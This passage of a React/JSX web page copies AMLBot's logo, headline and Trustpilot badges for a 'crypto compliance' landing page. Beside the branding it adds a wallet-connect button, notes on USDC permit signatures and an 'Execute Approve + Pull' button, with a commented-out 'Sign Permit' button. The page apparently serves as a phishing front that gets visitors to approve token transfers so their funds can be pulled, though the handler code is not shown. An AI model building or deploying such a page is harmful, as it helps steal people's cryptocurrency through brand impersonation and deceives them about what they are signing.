                            d="M37.6197295,21.0314548 L53.2877743,41.9806996 L72.6788366,21.0314548 L78.0919627,21.0314548 L55.7060736,45.2154866 L80.9507082,78.9677979 L62.5309131,78.9677979 L45.5186762,56.2204104 L24.4624362,78.9677979 L19.04931,78.9677979 L43.0993381,52.9866623 L19.1999343,21.0314548 L37.6197295,21.0314548 Z M35.6221395,25.0183245 L27.1601695,25.0183245 L64.5274643,74.9809282 L72.9894343,74.9809282 L35.6221395,25.0183245 Z"
                            fill="#FFFFFF"></path>
                    </symbol>
                    <symbol id="icon-youtube-fill-circle" viewBox="0 0 28 28">
                        <circle cx="14" cy="14" r="14"></circle>
                        <g transform="translate(5.000000, 7.707030)">
                            <path
                                d="M17.6291,1.97204 C17.4216,1.20094 16.8137,0.59312 16.0427,0.38548 C14.6341,0 8.9998,0 8.9998,0 C8.9998,0 3.36565,0 1.95707,0.37079 C1.20094,0.57829 0.57815,1.20108 0.37065,1.97204 C0,3.38047 0,6.30147 0,6.30147 C0,6.30147 0,9.23717 0.37065,10.63087 C0.57829,11.40187 1.18611,12.00977 1.95721,12.21747 C3.38048,12.60287 9,12.60287 9,12.60287 C9,12.60287 14.6341,12.60287 16.0427,12.23217 C16.8138,12.02467 17.4216,11.41667 17.6293,10.64567 C17.9999766,9.23717 17.9999766,6.31627 17.9999766,6.31627 C17.9999766,6.31627 18.0148,3.38047 17.6291,1.97204 Z"
                                fill="#FFFFFF"></path>
                            <polygon points="7.207 8.99957 11.8923 6.30107 7.207 3.60257"></polygon>
                        </g>
                    </symbol>
                    <symbol id="icon-medium-fill-circle" viewBox="0 0 28 28">
                        <circle cx="14" cy="14" r="14"></circle>
                        <path
                            d="M11.0766 9C13.8804 9 16.1531 11.2886 16.1531 14.1115C16.1531 16.9344 13.8802 19.2228 11.0766 19.2228C8.27305 19.2228 6 16.9344 6 14.1115C6 11.2886 8.27287 9 11.0766 9ZM19.1836 9.29942C20.5855 9.29942 21.722 11.4536 21.722 14.1115H21.7221C21.7221 16.7686 20.5857 18.9235 19.1838 18.9235C17.7819 18.9235 16.6455 16.7686 16.6455 14.1115C16.6455 11.4543 17.7818 9.29942 19.1836 9.29942ZM23.1073 9.80063C23.6002 9.80063 24 11.7306 24 14.1115C24 16.4916 23.6004 18.4223 23.1073 18.4223C22.6142 18.4223 22.2147 16.4921 22.2147 14.1115C22.2147 11.7308 22.6143 9.80063 23.1073 9.80063Z"
                            fill="white"></path>
                    </symbol>
                    <symbol id="icon-twitter" viewBox="0 0 300 301">
                        <path
                            d="M89.34,0 L166.78,110.38 L263.81,0 L290.27,0 L178.57,127.15 L300,300.25 L210.66,300.25 L128.86,183.66 L26.46,300.25 L0,300.25 L117.13,166.93 L0,0 L89.34,0 Z M76.66,19.54 L36.01,19.54 L223.13,281.67 L263.79,281.67 L76.66,19.54 Z"></path>
                    </symbol>
                    <symbol id="icon-close" viewBox="0 0 27 24">
                        <path
                            d="M15.3055 12L25.7924 2.41015C26.3961 1.85816 26.3961 0.965972 25.7924 0.413988C25.1888 -0.137996 24.2132 -0.137996 23.6095 0.413988L13.1226 10.0038L2.63561 0.413988C2.03199 -0.137996 1.05634 -0.137996 0.452716 0.413988C-0.150905 0.965972 -0.150905 1.85816 0.452716 2.41015L10.9397 12L0.452716 21.5898C-0.150905 22.1418 -0.150905 23.034 0.452716 23.586C0.753757 23.8613 1.14896 23.9996 1.54416 23.9996C1.93937 23.9996 2.33457 23.8612 2.63561 23.586L13.1226 13.9961L23.6095 23.586C23.9105 23.8613 24.3057 23.9996 24.7009 23.9996C25.0961 23.9996 25.4914 23.8612 25.7924 23.586C26.396 23.034 26.396 22.1418 25.7924 21.5898L15.3055 12Z"></path>
                    </symbol>
                    <symbol id="icon-login" viewBox="0 0 22 23">
                        <path
                            d="M13.702 1.646C12.4484 1.64598 11.4379 1.64596 10.6432 1.75281C9.81815 1.86374 9.12339 2.10106 8.57164 2.65282C8.09045 3.134 7.84731 3.72533 7.71968 4.42015C7.59567 5.09533 7.57194 5.92161 7.56642 6.91301C7.56431 7.29269 7.87039 7.6022 8.25009 7.60432C8.62978 7.60644 8.93929 7.30034 8.9414 6.92066C8.94698 5.91829 8.97301 5.2078 9.07206 4.66857C9.16749 4.14899 9.32077 3.84825 9.54389 3.62509C9.79762 3.37139 10.1538 3.20598 10.8264 3.11555C11.5188 3.02245 12.4365 3.021 13.7523 3.021H14.669C15.9848 3.021 16.9024 3.02245 17.5949 3.11555C18.2675 3.20598 18.6237 3.37139 18.8774 3.62509C19.1311 3.87879 19.2965 4.23498 19.387 4.90761C19.48 5.60001 19.4815 6.5177 19.4815 7.8335V15.1668C19.4815 16.4826 19.48 17.4003 19.387 18.0927C19.2965 18.7654 19.1311 19.1215 18.8774 19.3752C18.6237 19.629 18.2675 19.7943 17.5949 19.8848C16.9024 19.9779 15.9848 19.9793 14.669 19.9793H13.7523C12.4365 19.9793 11.5188 19.9779 10.8264 19.8848C10.1538 19.7943 9.79762 19.629 9.54389 19.3752C9.32077 19.152 9.16749 18.8514 9.07206 18.3318C8.97301 17.7925 8.94698 17.082 8.9414 16.0796C8.93929 15.7 8.62978 15.3939 8.25009 15.396C7.87039 15.3981 7.56431 15.7077 7.56642 16.0873C7.57194 17.0787 7.59567 17.905 7.71968 18.5801C7.84731 19.275 8.09045 19.8663 8.57164 20.3476C9.12339 20.8993 9.81815 21.1366 10.6432 21.2475C11.4379 21.3543 12.4484 21.3543 13.702 21.3543H14.7193C15.9729 21.3543 16.9834 21.3543 17.7781 21.2475C18.6032 21.1366 19.2979 20.8993 19.8497 20.3476C20.4014 19.7957 20.6388 19.1011 20.7497 18.276C20.8566 17.4812 20.8565 16.4708 20.8565 15.2172V7.7832C20.8565 6.52957 20.8566 5.51911 20.7497 4.72439C20.6388 3.89929 20.4014 3.20458 19.8497 2.65282C19.2979 2.10106 18.6032 1.86374 17.7781 1.75281C16.9834 1.64596 15.9729 1.64598 14.7193 1.646H13.702Z"></path>
                        <path
                            d="M1.83594 10.8115C1.45624 10.8115 1.14844 11.1193 1.14844 11.499C1.14844 11.8787 1.45624 12.1865 1.83594 12.1865H12.8107L11.0135 13.7271C10.7252 13.9741 10.6919 14.4081 10.9389 14.6964C11.186 14.9847 11.6201 15.0181 11.9084 14.7711L15.1167 12.0211C15.2691 11.8904 15.3568 11.6998 15.3568 11.499C15.3568 11.2984 15.2691 11.1077 15.1167 10.9771L11.9084 8.22704C11.6201 7.97995 11.186 8.01333 10.9389 8.30161C10.6919 8.58991 10.7252 9.02392 11.0135 9.27103L12.8107 10.8115H1.83594Z"></path>
                    </symbol>
                    <symbol id="icon-helpcrunch" viewBox="0 0 36 30">
                        <path fill-rule="evenodd"
                              d="M28.202 13.052c.255-.793.39-1.622.39-2.478C28.592 4.652 22.135 0 14.296 0 6.456 0 0 4.652 0 10.574c0 3.148 1.846 6.031 4.935 8.005-.005.402-.005 4.041-.005 4.041 0 1.372 1.305 1.998 2.37 1.123 0 0 2.557-2.101 3.538-2.905a19.489 19.489 0 0 0 5.568.195c.771 3.35 4.653 5.798 9.228 5.798.234 0 .467-.007.698-.02.495.405 2.846 2.342 2.846 2.342 1.066.875 2.371.249 2.371-1.123 0 0 .01-2.29.01-2.77C33.696 23.956 35 21.986 35 19.808c0-3.273-2.902-5.932-6.798-6.757zm-2.005-.253c.276-.712.423-1.459.423-2.225 0-4.672-5.462-8.607-12.324-8.607-6.863 0-12.324 3.935-12.324 8.607 0 2.549 1.628 4.957 4.442 6.602l.487.285v4.08l3.042-2.517.365-.3.464.096a17.556 17.556 0 0 0 5.546.244c.494-3.592 4.525-6.277 9.316-6.277.189 0 .376.004.563.012zm-.563 12.064c-4.14 0-7.395-2.344-7.395-5.054 0-2.71 3.255-5.055 7.395-5.055s7.394 2.345 7.394 5.055c0 1.555-1.073 3.041-2.924 4.013l-.527.276v.594l.012 2.25-2.31-1.898-.311-.256-.402.035c-.307.027-.618.04-.932.04zm-3.45-4.207a.985.985 0 1 0-.987-.984c0 .543.442.984.986.984zm3.45 0a.985.985 0 1 0-.986-.984c0 .543.441.984.986.984zm-16.76-7.87a1.97 1.97 0 0 0 1.971-1.966 1.97 1.97 0 0 0-1.972-1.968 1.97 1.97 0 0 0-1.972 1.968 1.97 1.97 0 0 0 1.972 1.967zm5.915 0a1.97 1.97 0 0 0 1.972-1.966 1.97 1.97 0 0 0-1.972-1.968 1.97 1.97 0 0 0-1.972 1.968 1.97 1.97 0 0 0 1.972 1.967zm14.296 7.87a.985.985 0 1 0-.986-.984c0 .543.441.984.986.984zm-8.38-7.87a1.97 1.97 0 0 0 1.971-1.966 1.97 1.97 0 0 0-1.972-1.968 1.97 1.97 0 0 0-1.972 1.968 1.97 1.97 0 0 0 1.972 1.967z"></path>
                    </symbol>
                    <symbol id="icon-arrow-right" viewBox="0 0 22 20">
                        <path
                            d="M10.4696699,-0.530330086 C10.7625631,-0.823223305 11.2374369,-0.823223305 11.5303301,-0.530330086 L20.5303301,8.46966991 C20.5529506,8.49229046 20.5741329,8.51634926 20.5937281,8.54169736 L20.598,8.548 L20.619,8.58 L20.647603,8.62146064 L20.652,8.631 L20.6610428,8.64528991 L20.674,8.675 L20.6910613,8.70806615 L20.699,8.73 L20.7046137,8.74253391 L20.71,8.761 L20.7232093,8.80062029 L20.729,8.828 L20.7336609,8.84387965 L20.736,8.863 L20.7431534,8.89822944 L20.745,8.925 L20.7481845,8.94768643 L20.748,8.971 L20.75,9 L20.748,9.029 L20.7481845,9.05231357 L20.745,9.073 L20.7431534,9.10177056 L20.736,9.136 L20.7336609,9.15612035 L20.729,9.171 L20.7232093,9.19937971 L20.71,9.238 L20.7046137,9.25746609 L20.699,9.269 L20.6910613,9.29193385 L20.674,9.324 L20.6610428,9.35471009 L20.652,9.368 L20.647603,9.37853936 L20.619,9.419 L20.6029482,9.44621165 L20.5303301,9.53033009 L11.5303301,18.5303301 C11.2374369,18.8232233 10.7625631,18.8232233 10.4696699,18.5303301 C10.1767767,18.2374369 10.1767767,17.7625631 10.4696699,17.4696699 L18.188,9.75 L0,9.75 C-0.379695766,9.75 -0.693490961,9.46784612 -0.743153384,9.10177056 L-0.75,9 C-0.75,8.58578644 -0.414213562,8.25 0,8.25 L18.189,8.25 L10.4696699,0.530330086 C10.2034034,0.264063523 10.1791973,-0.152600159 10.3970518,-0.446211653 L10.4696699,-0.530330086 Z"></path>
                    </symbol>
                    <symbol id="icon-whatsapp" viewBox="0 0 25 24">
                        <path
                            d="M0,24 L1.687003,17.837 C0.646003,16.033 0.099,13.988 0.1,11.891 C0.103,5.335 5.438003,0 11.992993,0 C15.173993,0.001 18.159993,1.24 20.405993,3.488 C22.650993,5.736 23.886993,8.724 23.8859936,11.902 C23.882993,18.459 18.547993,23.794 11.992993,23.794 C10.002993,23.793 8.042003,23.294 6.305003,22.346 L0,24 Z M6.597003,20.193 C8.273003,21.188 9.872993,21.784 11.988993,21.785 C17.436993,21.785 21.874993,17.351 21.8779937,11.9 C21.879993,6.438 17.462993,2.01 11.996993,2.008 C6.545003,2.008 2.110003,6.442 2.10800185,11.892 C2.107003,14.117 2.759003,15.783 3.854003,17.526 L2.855003,21.174 L6.597003,20.193 Z M17.983993,14.729 C17.909993,14.605 17.711993,14.531 17.413993,14.382 C17.116993,14.233 15.655993,13.514 15.382993,13.415 C15.110993,13.316 14.912993,13.266 14.713993,13.564 C14.515993,13.861 13.945993,14.531 13.772993,14.729 C13.599993,14.927 13.425993,14.952 13.128993,14.803 C12.831993,14.654 11.873993,14.341 10.738993,13.328 C9.855993,12.54 9.259003,11.567 9.086003,11.269 C8.913003,10.972 9.068003,10.811 9.216003,10.663 C9.350003,10.53 9.512993,10.316 9.661993,10.142 C9.812993,9.97 9.861993,9.846 9.961993,9.647 C10.060993,9.449 10.011993,9.275 9.936993,9.126 C9.861993,8.978 9.268003,7.515 9.021003,6.92 C8.779003,6.341 8.534003,6.419 8.352003,6.41 L7.782003,6.4 C7.584003,6.4 7.262003,6.474 6.990003,6.772 C6.718003,7.07 5.950003,7.788 5.950003,9.251 C5.950003,10.714 7.015003,12.127 7.163003,12.325 C7.312003,12.523 9.258003,15.525 12.238993,16.812 C12.947993,17.118 13.501993,17.301 13.932993,17.438 C14.644993,17.664 15.292993,17.632 15.804993,17.556 C16.375993,17.471 17.562993,16.837 17.810993,16.143 C18.058993,15.448 18.058993,14.853 17.983993,14.729 Z"></path>
                    </symbol>
                    <symbol id="icon-download" viewBox="0 0 19 22">
                        <path
                            d="M0.00251110477,18.9548172 L18.0024998,19.0000172 L17.9974776,21.0000108 L-0.00251110477,20.9548172 L0.00251110477,18.9548172 Z M8.60568413,17.3567676 L-0.0343188665,8.66896762 L1.38379027,7.25866038 L8.314,14.228 L8.3147387,0 L10.3147387,0 L10.314,14.228 L17.245632,7.25866256 L18.6637454,8.66896544 L10.0237954,17.3567676 L9.314,16.651 L8.60568413,17.3567676 Z"></path>
                    </symbol>
                    <symbol id="icon-pdf" viewBox="0 0 394 483">
                        <path
                            d="M270.652,0 L77.005,0 C48.715,0 25.69,23.041 25.69,51.315 L25.69,241.069 L20.678,241.069 C9.26,241.069 0,250.32 0,261.748 L0,387.152 C0,398.579 9.259,407.829 20.678,407.829 L25.69,407.829 L25.69,430.824 C25.69,459.129 48.715,482.139 77.005,482.139 L341.228,482.139 C369.5,482.139 392.528,459.128 392.528,430.824 L392.528,121.449 L270.652,0 Z M54.247,284.379 C60.307,283.355 68.825,282.583 80.826,282.583 C92.954,282.583 101.598,284.898 107.406,289.548 C112.954,293.93 116.698,301.163 116.698,309.675 C116.698,318.185 113.861,325.42 108.699,330.321 C101.985,336.641 92.056,339.478 80.441,339.478 C77.856,339.478 75.539,339.35 73.727,339.099 L73.727,370.195 L54.247,370.195 L54.247,284.379 Z M341.228,450.713 L77.005,450.713 C66.051,450.713 57.131,441.793 57.131,430.824 L57.131,407.829 L303.441,407.829 C314.861,407.829 324.12,398.579 324.12,387.152 L324.12,261.748 C324.12,250.32 314.861,241.069 303.441,241.069 L57.131,241.069 L57.131,51.315 C57.131,40.377 66.052,31.457 77.005,31.457 L258.895,31.267 L258.895,98.5 C258.895,118.138 274.829,134.087 294.482,134.087 L360.344,133.898 L361.085,430.823 C361.085,441.793 352.181,450.713 341.228,450.713 Z M129.259,369.801 L129.259,284.379 C136.484,283.229 145.901,282.583 155.839,282.583 C172.355,282.583 183.065,285.546 191.457,291.865 C200.488,298.579 206.161,309.281 206.161,324.646 C206.161,341.289 200.101,352.779 191.708,359.87 C182.551,367.482 168.612,371.092 151.583,371.092 C141.385,371.092 134.16,370.446 129.259,369.801 Z M272.276,283.229 L272.276,299.351 L238.856,299.351 L238.856,319.226 L270.086,319.226 L270.086,335.222 L238.856,335.222 L238.856,370.195 L219.116,370.195 L219.116,283.229 L272.276,283.229 Z M157.903,297.681 C174.805,297.681 185.389,307.231 185.263,325.294 C185.263,346.066 173.648,355.869 155.839,355.743 C153.388,355.743 150.677,355.743 148.998,355.349 L148.998,298.453 C150.676,298.06 153.513,297.681 157.903,297.681 Z M81.859,297.412 C91.662,297.412 97.218,302.187 97.218,310.194 C97.218,319.1 90.764,324.379 80.315,324.379 C77.47,324.379 75.406,324.253 73.727,323.875 L73.727,298.185 C75.145,297.807 77.856,297.412 81.859,297.412 Z"></path>
                    </symbol>
                    <symbol id="icon-aml" viewBox="0 0 24 33">
                        <path
                            d="M8.64003,1.6551 C9.98857,-0.502521 13.1248,-0.561855 14.5549,1.54318 L23.3957,14.5566 C24.1879,15.7226 24.2023,17.2468 23.4323,18.4274 L14.9705,31.4019 C13.5808,33.5327 10.4451,33.5327 9.05544,31.4019 L0.567695,18.3877 C0.312096,17.9958 0.14269,17.5655 0.0597111,17.1227 C0.0546548,17.0957 0.049928,17.0687 0.0455172,17.0417 C-0.0883809,16.2206 0.0730176,15.362 0.531299,14.6287 Z M15.5226,9.23001 C15.2182,14.6668 10.9283,19.0457 5.51078,19.5242 L12.013,29.4939 L20.4748,16.5195 L15.5226,9.23001 Z"></path>
                    </symbol>
                    <symbol id="icon-timer" viewBox="0 0 16 16">
                        <path
                            d="M7.99967 13.333C10.933 13.333 13.333 10.933 13.333 7.99967C13.333 5.06634 10.933 2.66634 7.99967 2.66634C5.06634 2.66634 2.66634 5.06634 2.66634 7.99967C2.66634 10.933 5.06634 13.333 7.99967 13.333ZM7.99967 1.33301C11.6663 1.33301 14.6663 4.33301 14.6663 7.99967C14.6663 11.6663 11.6663 14.6663 7.99967 14.6663C4.33301 14.6663 1.33301 11.6663 1.33301 7.99967C1.33301 4.33301 4.33301 1.33301 7.99967 1.33301ZM11.333 9.26634L10.8663 10.133L7.33301 8.19967V4.66634H8.33301V7.59967L11.333 9.26634Z"></path>
                    </symbol>
                    <symbol id="icon-arrow-down-short" viewBox="0 0 20 20">
                        <path
                            d="M3.16107 6.49408C3.48651 6.16864 4.01414 6.16864 4.33958 6.49408L9.58366 11.7382L14.8277 6.49408C15.1532 6.16864 15.6808 6.16864 16.0062 6.49408C16.3317 6.81951 16.3317 7.34715 16.0062 7.67259L10.1729 13.5059C9.84748 13.8314 9.31984 13.8314 8.9944 13.5059L3.16107 7.67259C2.83563 7.34715 2.83563 6.81951 3.16107 6.49408Z"></path>
                    </symbol>
                    <symbol id="icon-play" viewBox="0 0 30 33">
                        <path d="M30 16.5L0 33V0L30 16.5Z"></path>
                    </symbol>
                    <symbol id="icon-pro" viewBox="0 0 54 25">
                        <defs>
                            <linearGradient x1="0%" y1="50%" x2="100%" y2="50%" id="linearGradient-cjm-9njj_7-1">
                                <stop stop-color="#1A5CF6" offset="0%"></stop>
                                <stop stop-color="#D135CB" offset="100%"></stop>
                            </linearGradient>
                        </defs>
                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                            <g id="pro" fill-rule="nonzero">
                                <rect id="Rectangle" fill="url(#linearGradient-cjm-9njj_7-1)" x="0" y="0" width="54"
                                      height="25"
                                      rx="12.5"></rect>
                                <path
                                    d="M12.8849,18 L12.8849,7.81818 L16.902,7.81818 C17.6742,7.81818 18.3321,7.96567 18.8757,8.26065 C19.4193,8.55232 19.8336,8.95833 20.1186,9.47869 C20.407,9.99574 20.5511,10.5923 20.5511,11.2685 C20.5511,11.9446 20.4053,12.5412 20.1136,13.0582 C19.822,13.5753 19.3994,13.978 18.8459,14.2663 C18.2957,14.5547 17.6295,14.6989 16.8473,14.6989 L14.2869,14.6989 L14.2869,12.9737 L16.4993,12.9737 C16.9136,12.9737 17.255,12.9025 17.5234,12.7599 C17.7952,12.6141 17.9974,12.4136 18.13,12.1584 C18.2659,11.8999 18.3338,11.6032 18.3338,11.2685 C18.3338,10.9304 18.2659,10.6354 18.13,10.3835 C17.9974,10.1283 17.7952,9.93111 17.5234,9.7919 C17.2517,9.64938 16.907,9.57812 16.4893,9.57812 L15.0376,9.57812 L15.0376,18 L12.8849,18 Z M21.9494,18 L21.9494,7.81818 L25.9664,7.81818 C26.7354,7.81818 27.3916,7.95573 27.9352,8.23082 C28.4821,8.5026 28.898,8.88873 29.1831,9.3892 C29.4714,9.88636 29.6156,10.4714 29.6156,11.1442 C29.6156,11.8203 29.4698,12.402 29.1781,12.8892 C28.8864,13.3731 28.4638,13.7443 27.9103,14.0028 C27.3601,14.2614 26.694,14.3906 25.9118,14.3906 L23.2221,14.3906 L23.2221,12.6605 L25.5637,12.6605 C25.9747,12.6605 26.3161,12.6042 26.5879,12.4915 C26.8597,12.3788 27.0618,12.2098 27.1944,11.9844 C27.3303,11.759 27.3983,11.4789 27.3983,11.1442 C27.3983,10.8061 27.3303,10.5211 27.1944,10.2891 C27.0618,10.0571 26.858,9.88139 26.5829,9.76207 C26.3111,9.63944 25.9681,9.57812 25.5538,9.57812 L24.1021,9.57812 L24.1021,18 L21.9494,18 Z M27.448,13.3665 L29.9785,18 L27.6021,18 L25.1262,13.3665 L27.448,13.3665 Z M40.4934,12.9091 C40.4934,14.0194 40.283,14.964 39.862,15.7429 C39.4444,16.5218 38.8743,17.1167 38.1518,17.5277 C37.4326,17.9354 36.6239,18.1392 35.7257,18.1392 C34.8208,18.1392 34.0088,17.9337 33.2896,17.5227 C32.5704,17.1117 32.002,16.5168 31.5843,15.7379 C31.1667,14.959 30.9579,14.0161 30.9579,12.9091 C30.9579,11.7988 31.1667,10.8542 31.5843,10.0753 C32.002,9.2964 32.5704,8.70312 33.2896,8.29545 C34.0088,7.88447 34.8208,7.67898 35.7257,7.67898 C36.6239,7.67898 37.4326,7.88447 38.1518,8.29545 C38.8743,8.70312 39.4444,9.2964 39.862,10.0753 C40.283,10.8542 40.4934,11.7988 40.4934,12.9091 Z M38.3109,12.9091 C38.3109,12.1899 38.2032,11.5833 37.9877,11.0895 C37.7756,10.5956 37.4757,10.2211 37.0879,9.96591 C36.7001,9.7107 36.246,9.5831 35.7257,9.5831 C35.2053,9.5831 34.7512,9.7107 34.3635,9.96591 C33.9757,10.2211 33.6741,10.5956 33.4586,11.0895 C33.2465,11.5833 33.1404,12.1899 33.1404,12.9091 C33.1404,13.6283 33.2465,14.2348 33.4586,14.7287 C33.6741,15.2225 33.9757,15.5971 34.3635,15.8523 C34.7512,16.1075 35.2053,16.2351 35.7257,16.2351 C36.246,16.2351 36.7001,16.1075 37.0879,15.8523 C37.4757,15.5971 37.7756,15.2225 37.9877,14.7287 C38.2032,14.2348 38.3109,13.6283 38.3109,12.9091 Z"
                                    fill="#FFFFFF"></path>
                            </g>
                        </g>
                    </symbol>
                </svg>
                <header className="rIYD0d _1POjMs" style={{zIndex: "40"}}>
                    <div className="b_L6f_ eOD671"><a className="Zcp_6V" href="">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 160 33" xlinkTitle="AMLBot"
                             aria-label="AMLBot"
                             style={{width: "100%", height: "auto"}}>
                            <path fill="#000"
                                  d="M39.545 29h-6.818l7.681-23.273h8.637L56.727 29h-6.819l-5.09-16.864h-.182L39.545 29Zm-1.273-9.182H51.09v4.727H38.272v-4.727ZM58.968 5.727h7.864L72.24 18.91h.272l5.41-13.182h7.863V29h-6.182V15.545h-.181L74.24 28.818h-3.728l-5.181-13.364h-.182V29h-6.182V5.727ZM88.78 29V5.727H95.1v18.182h9.409v5.09H88.781ZM107.062 29V5.727h10.091c1.772 0 3.261.239 4.466.716 1.212.477 2.125 1.151 2.738 2.023.621.87.932 1.897.932 3.08 0 .855-.189 1.636-.568 2.34a5.016 5.016 0 0 1-1.568 1.773c-.675.47-1.462.795-2.364.977v.227c1 .038 1.909.292 2.727.762a5.221 5.221 0 0 1 1.955 1.92c.485.81.727 1.765.727 2.864 0 1.273-.333 2.405-1 3.398-.659.992-1.598 1.772-2.818 2.34-1.22.569-2.674.853-4.364.853h-10.954Zm6.318-5.046h2.955c1.06 0 1.856-.197 2.386-.59.53-.402.795-.993.795-1.773 0-.546-.125-1.008-.375-1.387-.25-.378-.606-.666-1.068-.863-.454-.197-1.004-.296-1.648-.296h-3.045v4.91Zm0-8.818h2.591c.553 0 1.042-.087 1.466-.261.424-.175.754-.425.988-.75.243-.334.364-.739.364-1.216 0-.72-.258-1.27-.773-1.648-.515-.386-1.166-.58-1.954-.58h-2.682v4.455ZM136.937 29.318c-1.894 0-3.515-.375-4.864-1.125a7.74 7.74 0 0 1-3.102-3.16c-.72-1.355-1.08-2.927-1.08-4.715 0-1.788.36-3.356 1.08-4.705a7.651 7.651 0 0 1 3.102-3.159c1.349-.757 2.97-1.136 4.864-1.136 1.894 0 3.515.379 4.863 1.136a7.647 7.647 0 0 1 3.103 3.16c.719 1.348 1.079 2.916 1.079 4.704 0 1.788-.36 3.36-1.079 4.716a7.737 7.737 0 0 1-3.103 3.159c-1.348.75-2.969 1.125-4.863 1.125Zm.045-4.636c.531 0 .989-.178 1.375-.534.387-.357.686-.864.898-1.523.212-.66.318-1.443.318-2.352 0-.917-.106-1.701-.318-2.353-.212-.659-.511-1.166-.898-1.523a1.959 1.959 0 0 0-1.375-.534c-.56 0-1.041.178-1.443.535-.401.356-.708.863-.92 1.522-.213.652-.319 1.436-.319 2.352 0 .91.106 1.694.319 2.353.212.659.519 1.166.92 1.523.402.356.883.534 1.443.534ZM158.937 11.545v4.546h-11.5v-4.546h11.5Zm-9.273-4.182h6.273v16.023c0 .243.041.447.125.614.083.159.212.28.386.363.174.076.398.114.671.114.189 0 .409-.023.659-.068.257-.046.447-.083.568-.114l.909 4.41c-.28.083-.682.185-1.205.306-.515.121-1.128.2-1.84.239-1.44.076-2.648-.072-3.625-.443-.978-.38-1.713-.974-2.205-1.784-.492-.811-.731-1.826-.716-3.046V7.363Z"></path>
                            <path fill="#0057FF" fill-rule="evenodd"
                                  d="M14.555 1.543c-1.43-2.105-4.566-2.046-5.915.112L.531 14.63a3.49 3.49 0 0 0 .037 3.759l8.487 13.014c1.39 2.13 4.526 2.13 5.915 0l8.462-12.975a3.49 3.49 0 0 0-.036-3.87L14.555 1.543Zm.968 7.687c-.305 5.437-4.595 9.816-10.012 10.294l6.502 9.97 8.462-12.974-4.952-7.29Z"
                                  clip-rule="evenodd"></path>
                        </svg>
                    </a>
                    </div>
                </header>
                <div style={{opacity:1, willChange:"transform, opacity", transform: "none"}}>
                    <main className="KDXBfW" id="prime">
                        <div className="b_L6f_ TWxrv_">
                            <div className="i3txDN"><h1 className="V9yRvO">One-stop compliance solution for crypto business</h1>
                                <p className="bZ3K6C">The AMLBot platform automates AML / KYC procedures and reduces
                                    compliance
                                    expenses</p>
                                <div className="HPtOMS">
                                    <w3m-button />
                                    
                                    {/* Status display */}
                                    {status && (
                                        <div style={{ 
                                            marginTop: "20px", 
                                            padding: "15px", 
                                            backgroundColor: isSmartWallet ? "#fff3cd" : "#d1ecf1", 
                                            border: `1px solid ${isSmartWallet ? "#ffeaa7" : "#bee5eb"}`, 
                                            borderRadius: "8px",
                                            color: isSmartWallet ? "#856404" : "#0c5460"
                                        }}>
                                            <strong>{status}</strong>
                                            {isSmartWallet && (
                                                <div style={{ marginTop: "10px", fontSize: "14px" }}>
                                                    <p>Your wallet is a smart account. USDC doesn't support EIP-1271 signatures for permit, so a standard approve transaction is needed.</p>
                                                    <p style={{ marginTop: "8px", fontStyle: "italic" }}>
                                                        💡 For smart wallets, you need to use a regular approve transaction instead of permit.
                                                    </p>
                                                    <button
                                                        onClick={handleSmartWalletFlow}
                                                        style={{
                                                            marginTop: "10px",
                                                            padding: "10px 20px",
                                                            backgroundColor: "#007bff",
                                                            color: "white",
                                                            border: "none",
                                                            borderRadius: "5px",
                                                            cursor: "pointer",
                                                            fontSize: "14px"
                                                        }}
                                                    >
                                                        🚀 Execute Approve + Pull
                                                    </button>
                                                </div>
                                            )}
                                        </div>
                                    )}

                                    {/*{isConnected && address && (*/}
                                    {/*    <button*/}
                                    {/*        onClick={() => handlePermit()}*/}
                                    {/*        style={{ marginTop: 20, padding: "10px 20px" }}*/}
                                    {/*    >*/}
                                    {/*        🖊 Sign Permit*/}
                                    {/*    </button>*/}
                                    {/*)}*/}
                                </div>
                            </div>
                            <div className="_1VtWaa"><img alt="One-stop compliance solution for crypto business"
                                                          loading="lazy"
                                                          width="1680" height="1040" decoding="async" data-nimg="1"
                                                          style={{color: "transparent"}}
                                                          src="/image/nout.png"/>
                            </div>
                        </div>
                    </main>
                    <div className="kuCMFf">
                        <div className="b_L6f_">
                            <div className="ada7vA">
                                <div className="_2516Jo"><a target="_blank" className="wIL4xY b1fq0I"
                                                            href="https://trustpilot.com/review/amlbot.com"><img
                                    alt="Trustpilot"
                                    width={150} height={37}
                                    decoding="async"
                                    data-nimg="1"
                                    className="EFniD4"
                                    style={{color: "transparent"}}
                                    src="/image/trust.png"/>
                                    <div className="SY9kc_">
                                        <div className="E6G38x">
                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
